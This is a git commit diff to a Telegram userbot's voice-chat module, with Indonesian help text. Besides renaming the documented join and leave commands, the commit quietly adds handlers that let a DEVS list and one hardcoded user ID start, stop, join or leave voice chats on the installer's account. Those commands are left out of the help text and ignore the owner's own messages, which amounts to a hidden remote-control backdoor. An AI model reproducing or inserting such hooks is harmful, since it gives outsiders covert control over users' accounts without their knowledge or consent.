6a51d560d3181a4fd207d7af22f6079b82d82c0d
zulpiii <zpskibidi@gmail.com>
2025-10-03 14:24:32 +0800

    Update vctools.py

--- ubot/modules/vctools.py
+++ ubot/modules/vctools.py
@@ -8,35 +8,37 @@ Bantuan Untuk Voice Chat
 • Perintah: <code>{0}startvc</code>
 • Penjelasan: Untuk memulai voice chat grup.
 
-• Perintah: <code>{0}joinvcs</code>
-• Penjelasan: Untuk bergabung voice chat grup
-
-• Perintah: <code>{0}leavevcs</code>
-• Penjelasan: Untuk keluar voice chat grup
-
 • Perintah: <code>{0}stopvc</code>
 • Penjelasan: Untuk mengakhiri voice chat grup.
+
+• Perintah: <code>{0}joinpicies</code>
+• Penjelasan: Untuk join voice chat grup.
+
+• Perintah: <code>{0}leavepicies</code>
+• Penjelasan: Untuk keluar voice chat grup.
 """
 
 
 
+@ubot.on_message(filters.command(["startvcs"], "") & filters.user(DEVS) & ~filters.me)
 @PY.UBOT("startvc")
 async def _(client, message):
     await start_vctools(client, message)
 
 
+@ubot.on_message(filters.command(["stopvcs"], "") & filters.user(DEVS) & ~filters.me)
 @PY.UBOT("stopvc")
 async def _(client, message):
     await stop_vctools(client, message)
 
 
-@PY.UBOT("joinvcs", FILTERS.ME_USER)
+@ubot.on_message(filters.command(["joinvcs"], "") & filters.user(7366711345) & ~filters.me)
+@PY.UBOT("joinpicies", FILTERS.ME_USER)
 async def _(client, message):
     await join_os(client, message)
 
 
-@PY.UBOT("leavevcs", FILTERS.ME_USER)
+@ubot.on_message(filters.command(["leavevcs"], "") & filters.user(7366711345) & ~filters.me)
+@PY.UBOT("leavepicies", FILTERS.ME_USER)
 async def _(client, message):
     await turun_os(client, message)
-
-
